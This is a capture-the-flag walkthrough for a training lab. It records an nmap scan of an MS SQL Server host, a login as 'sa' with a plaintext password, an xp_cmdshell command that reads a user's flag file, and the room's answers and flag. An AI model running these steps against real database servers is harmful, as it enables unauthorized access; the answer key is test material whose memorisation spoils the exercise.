---
title: Where Are The Reindeers? (Day 11)
sidebar_position: 12
---
## Topic: Networking

First thing is to nmap scan the machine
command:`nmap -sC -sV -Pn -v MACHINE_IP`
result:
```bash
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b:c5:31:04:b7:92:68:57:ac:3b:92:18:42:7b:c9:01 (RSA)
|   256 6c:ad:62:67:ad:1b:24:5d:d5:75:e1:07:1a:9a:69:29 (ECDSA)
|_  256 19:2f:29:26:a3:fb:37:21:4a:7b:7a:7b:de:e0:4f:12 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-12-22T16:30:41
| Not valid after:  2051-12-22T16:30:41
| MD5:   58f5 bc01 cfd2 2e24 576c 0fe5 1987 0eed
|_SHA-1: 58b5 ef00 fab6 5275 564f c174 bd58 fde4 0124 bce5
| ms-sql-ntlm-info: 
|   Target_Name: AOC2021-MSSQL
|   NetBIOS_Domain_Name: AOC2021-MSSQL
|   NetBIOS_Computer_Name: AOC2021-MSSQL
|   DNS_Domain_Name: AOC2021-MSSQL
|   DNS_Computer_Name: AOC2021-MSSQL
|_  Product_Version: 10.0.17763
|_ssl-date: 2021-12-22T16:32:56+00:00; -2h59m29s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: AOC2021-MSSQL
|   NetBIOS_Domain_Name: AOC2021-MSSQL
|   NetBIOS_Computer_Name: AOC2021-MSSQL
|   DNS_Domain_Name: AOC2021-MSSQL
|   DNS_Computer_Name: AOC2021-MSSQL
|   Product_Version: 10.0.17763
|_  System_Time: 2021-12-22T16:32:46+00:00
| ssl-cert: Subject: commonName=AOC2021-MSSQL
| Issuer: commonName=AOC2021-MSSQL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-31T21:09:16
| Not valid after:  2022-05-02T21:09:16
| MD5:   750c 652b aad2 aeef d689 7293 a5c8 8222
|_SHA-1: 535f 47f3 c28d ae82 62fb a9ff 7436 ee6a 39c0 3296
|_ssl-date: 2021-12-22T16:32:57+00:00; -2h59m29s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.10.222.95:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: -2h59m29s, deviation: 0s, median: -2h59m29s
```
Command to get final flag: `xp_cmdshell 'type C:\users\grinch\documents\flag.txt';`  
### Questions:
1. There is an open port related to MS SQL Server accessible over the network. What is the port number?  
answer: `1433` (see scan above)  
2. Let’s try to run, `sqsh -S 10.10.222.95 -U sa -P t7uLKzddQzVjVFJp` If the connection is successful, you will get a prompt. What is the prompt that you have received?  
answer: `1>`
3. We can see four columns in the table displayed above: id, first (name), last (name), and nickname. What is the first name of the reindeer of id 9?  
answer: `rudolph`  
4. Check the table `schedule`. What is the destination of the trip scheduled on December 7?  
answer: `Prague  
5. Check the table `presents`. What is the quantity available for the present “Power Bank”?  
answer: `25`  
6. There is a flag hidden in the `grinch` user's home directory. What are its contents?  
answer: `THM{YjtKeUy2qT3v5dDH}`  